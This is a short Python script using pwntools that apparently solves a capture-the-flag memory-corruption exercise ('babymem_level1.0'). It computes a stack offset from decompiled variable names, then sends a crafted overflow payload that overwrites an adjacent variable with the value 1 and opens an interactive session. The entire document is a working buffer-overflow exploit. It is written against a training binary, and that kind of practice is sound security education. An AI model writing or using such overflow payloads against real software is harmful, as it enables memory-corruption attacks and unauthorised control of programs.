from pwn import *

# Init
elf = ELF("/challenge/babymem_level1.0")
context.arch = "amd64"
context.endian = "little"
io = elf.process()

buffer_length = int("58", 16) #local_58
value_to_modify_distance = int("20", 16) #local_20
distance_between_buffer_and_value_to_modify = buffer_length - value_to_modify_distance

# Payload

payload = b"A"*distance_between_buffer_and_value_to_modify + p64(0x1) + b"B"*value_to_modify_distance*8

io.recvuntil("size:")
io.sendline(str(buffer_length))

io.recvuntil("bytes)!")
io.sendline(payload)

io.interactive()